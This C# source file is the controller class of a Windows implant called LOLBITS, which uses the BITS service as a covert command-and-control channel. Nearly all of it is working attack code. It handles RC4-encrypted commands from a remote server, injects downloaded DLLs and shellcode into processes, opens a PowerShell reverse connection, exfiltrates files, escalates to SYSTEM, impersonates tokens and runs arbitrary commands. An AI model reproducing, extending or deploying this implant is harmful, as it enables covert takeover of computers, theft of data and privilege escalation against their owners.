using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Text;
using System.Threading;
using LOLBITS.Loading;
using LOLBITS.TokenManagement;
using Newtonsoft.Json;
using BITS4 = BITSReference4_0;

namespace LOLBITS.Controlling
{

    public class Controller
    {
        private const string ContId = "7061796c676164";
        private readonly string _p;
        private string _id;
        private string _auth;
        private string[] _restoreKeys;
        private readonly string _tempPath;
        private readonly TokenManager _tokenManager;
        private readonly Jobs _jobsManager;
        private readonly SysCallManager _sysCall;

        public Controller(string id, string url,string password)
        {
            this._id = id;
            _p = password;
            _jobsManager = new Jobs(url);
            _sysCall = new SysCallManager();
            _tokenManager = new TokenManager(_sysCall);

            if (Environment.GetEnvironmentVariable("temp") != null)
            {
                _tempPath = Environment.GetEnvironmentVariable("temp");
            }
            else
            {
                _tempPath = @"C:\Windows\Temp\";
            }
        }

        public string GetPassword()
        {
            return _p;
        }

        public void Start()
        { 

            string startBits = "sc start BITS";
            Utils.ExecuteCommand(startBits);
            Thread.Sleep(500);
            string filePath = _tempPath + @"\" + _id;

            if (TryInitialCon(filePath))
            {
                Content file = GetEncryptedFileContent(filePath, out var unused);
                _id = file.NextId;
                _auth = file.NextAuth;
                _restoreKeys = file.Commands; 
                string domain = Environment.GetEnvironmentVariable("userdomain");
                string user = Environment.GetEnvironmentVariable("username");
                Response response = new Response(domain + @"\" + user, _auth);
                filePath = _tempPath + @"\" + _id + ".txt";
                EncryptResponseIntoFile(filePath, response);

                _jobsManager.Send(_id, filePath);

                Loop();
                

                /*Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    bitmap.Save(@"c:\users\pccom\desktop\test.jpg", ImageFormat.Jpeg);
                }*/
            }



        }

        private void Loop()
        {
            bool exit = false;
            string filePath, headers;

            while (!exit)
            {
                filePath = _tempPath + @"\" + _id;

                headers = "reqId: " + _auth;
                Console.WriteLine("next: " + _id);
                if (_jobsManager.Get(_id, filePath, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                {
                    Content file = GetEncryptedFileContent(filePath, out var unused);

                    _id = file.NextId;
                    _auth = file.NextAuth;
                    Console.WriteLine("Id: " + _id);
                    Console.WriteLine("Auth: " + _auth);

                    if (file.Commands.Length > 0)
                        DoSomething(file);
                    


                    Thread.Sleep(1000);
                }
                else
                {

                    if (_restoreKeys.Length > 0)
                    {
                        _auth = _restoreKeys[_restoreKeys.Length - 1];
                        Array.Resize(ref _restoreKeys,_restoreKeys.Length - 1);
                    }
                    else { exit = true; }
                }
            }

        }

        private void DoSomething(Content file)
        {

            string rps = "";

            try
            {
                switch (file.Commands[0])
                {
                    case "inject_dll":
                        {
                            string fileP = _tempPath + @"\" + _id;
                            string headers = "reqId: " + _auth + "\r\ncontid: " + ContId;

                            if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                            {
                                try
                                {
                                    Assembly dll = LoadDll(fileP);
                                    string method = file.Commands[1];
                                    string args = "";
                                    for (int i = 2; i < file.Commands.Length; i++)
                                    {
                                        args += file.Commands[i];
                                        if (i < file.Commands.Length)
                                            args += " ";
                                    }
                                    string[] arguments = new string[] { args };

                                    LauncherDll.Main(method, arguments, dll);
                                    rps = "Dll injected!";
                                }
                                catch (Exception)
                                {
                                    rps = "ERR:Fatal error ocurred while trying to inject the dll.\n";
                                }
                            }
                            else
                            {
                                rps = "ERR:Dll not found!\n";
                            }


                            break;
                        }

                    case "inject_shellcode":
                        {
                            string fileP = _tempPath + @"\" + _id;
                            string headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
                            int pid = -1;
                            if (file.Commands.Length >= 2)
                                pid = int.Parse(file.Commands[1]);


                            if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                            {
                                byte[] sh;
                                GetEncryptedFileContent(fileP, out sh);

                                try
                                {

                                    LauncherShellCode.Main(sh, _sysCall, pid);
                                    rps = "Shellcode injected!\n";
                                }
                                catch (Exception)
                                {
                                    rps = "ERR:Fatal error ocurred while trying to inject shellCode.\n";
                                }
                            }
                            else
                            {
                                rps = "ERR:Shellcode file not found!\n";
                            }

                            break;
                        }

                    case "powershell":
                        {
                            rps = Utils.ExecuteCommand("powershell -V 2 /C Write-Host hi");

                            if (rps.Replace("\n", "").Replace(" ", "") == "hi")
                            {
                                LauncherPowershell.Main(file.Commands[1], file.Commands[2]);
                                rps = "You should have your Powershell at " + file.Commands[1] + ":" + file.Commands[2] + "!\n";

                            }
                            else
                            {
                                rps = "Version 2 of Powershell not available. Try injecting EvilSalsa by CyberVaca in order to use powershell without am" + "si.\n";
                            }

                            break;
                        }

                    case "send":
                        {
                            string fileP = _tempPath + @"\" + _id;
                            string headers = "reqId: " + _auth + "\r\ncontid: " + ContId;

                            if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                            {
                                File.Copy(fileP, file.Commands[1], true);
                                rps = "Dowload finished.\n";
                            }
                            else
                            {
                                rps = "ERR:Download failed!\n";
                            }

                            break;
                        }
                    case "exfiltrate":
                        {
                            if (File.Exists(file.Commands[1]))
                            {
                                if (_jobsManager.Send(file.Commands[2], file.Commands[1]))
                                {
                                    rps = "Exfiltration succeed.\n";

                                }
                                else
                                    rps = "ERR:Exfiltration failed!\n";
                            }
                            else
                                rps = "ERR:File to exfiltrate not found!\n";

                            break;
                        }
                    case "getsystem":
                        {

                            if (Utils.IsHighIntegrity(_sysCall))
                                rps = TokenManager.GetSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
                            else
                                rps = "ERR:Process failed! Is this process running with high integrity level?\n";

                            break;
                        }

                    case "rev2self":
                        {
                            TokenManager.Rev2Self();
                            rps = "Welcome back.\n";

                            break;
                        }


                    case "runas":
                        {
                            string user = "", domain = "", password = "";
                            string[] userData = file.Commands[1].Split('\\');
                            if (userData.Length == 1)
                            {
                                domain = ".";
                                user = userData[0];
                            }
                            else
                            {
                                domain = userData[0];
                                user = userData[1];
                            }

                            password = file.Commands[2];

                            rps = TokenManager.RunAs(domain, user, password) ? "Success!" : "ERR:Invalid credentials.";


                            break;
                        }

                    case "list":
                        {
                            rps = GetProcessInfo();
                            break;
                        }

                    case "impersonate":
                        {
                            try
                            {
                                if (_tokenManager.Impersonate(int.Parse(file.Commands[1])))
                                    rps = "Impersonation achieved!\n";
                                else
                                    rps = "ERR: Not enough privileges!\n";
                            }
                            catch
                            {
                                rps = "ERR: Impersonation failed!\n";
                            }

                            break;

                        }

                    case "exit":
                        {
                            Environment.Exit(0);
                            break;
                        }

                    default:
                        {
                            rps = Utils.ExecuteCommand(file.Commands[0]);
                            break;
                        }


                }
            } catch
            {
                rps = "ERR: Something went wrong!";
            }
            Response response = new Response(rps, _auth);
            string filePath = _tempPath + @"\" + _id + ".txt";
            EncryptResponseIntoFile(filePath, response);
            TrySend(filePath);

        }

        private string GetProcessInfo()
        {
            string output = "\n";
            output = string.Concat(output, string.Format("{0,30}|{1,10}|{2,20}|\n", "NAME", "PID", "ACCOUNT"));
            foreach (var process in Process.GetProcesses())
            {
                string name = process.ProcessName;
                int processId = process.Id;

                output = string.Concat(output, string.Format("{0,30}|{1,10}|{2,20}|\n", name, processId, GetProcessOwner(processId)));
            }
            return output;
        }

        private static string GetProcessOwner (int processId)
        {

            string query = "Select * From Win32_Process Where ProcessID = " + processId;
            ManagementObjectSearcher moSearcher = new ManagementObjectSearcher(query);
            ManagementObjectCollection moCollection = moSearcher.Get();

            foreach (ManagementObject mo in moCollection)
            {
                string[] args = new string[] { string.Empty };
                int returnVal = Convert.ToInt32(mo.InvokeMethod("GetOwner", args));
                if (returnVal == 0)
                    return args[0];
            }

            return "UNKNOWN";
        }
        private bool TrySend(string filePath)
        {
            int cont = 0;
            while (cont < 5)
            {
                if (_jobsManager.Send(_id, filePath))
                {
                    return true;
                }
                ++cont;
            }
            return false;
        }

        private bool TryInitialCon(string filePath)
        {
            int cont = 0;
            while (cont < 5)
            {
                if(_jobsManager.Get(_id, filePath, null,BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                {
                    return true;
                }
                ++cont;
            }

            return false;
        }

        private void EncryptResponseIntoFile(string filePath, Response response)
        {
            string json_response = JsonConvert.SerializeObject(response);
            byte[] content_decrypted = Encoding.UTF8.GetBytes(json_response);
            byte[] xKey = Encoding.ASCII.GetBytes(_p);
            byte[] content_encrypted = Rc4.Encrypt(xKey, content_decrypted);
            string hexadecimal = BiteArrayToHex.Convert(content_encrypted);
            string fileContent = Zipper.Compress(hexadecimal);
            File.WriteAllText(filePath, fileContent);
        }

        private Content GetEncryptedFileContent(string filePath, out byte[] decrypted)
        {

            string fileStr = File.ReadAllText(filePath);
            byte[] xKey = Encoding.ASCII.GetBytes(_p);
            string hexadecimal = Zipper.Decompress(fileStr);
            byte[] content_encrypted = StringHexToByteArray.Convert(hexadecimal); 
            byte[] content_decrypted = Rc4.Decrypt(xKey, content_encrypted);
            decrypted = content_decrypted;
            string content_encoded = Encoding.UTF8.GetString(content_decrypted);

            try
            {
                Content final = JsonConvert.DeserializeObject<Content>(content_encoded);
                return final;

            } catch
            {
                return null;
            }
        }

        private Assembly LoadDll(string filePath)
        {
            string fileStr = File.ReadAllText(filePath);
            byte[] xKey = Encoding.ASCII.GetBytes(_p);
            string hexadecimal = Zipper.Decompress(fileStr);
            byte[] content_encrypted = StringHexToByteArray.Convert(hexadecimal);
            byte[] content_decrypted = Rc4.Decrypt(xKey, content_encrypted);
            Assembly dll = Assembly.Load(content_decrypted);

            return dll;
        }
 

    }
}
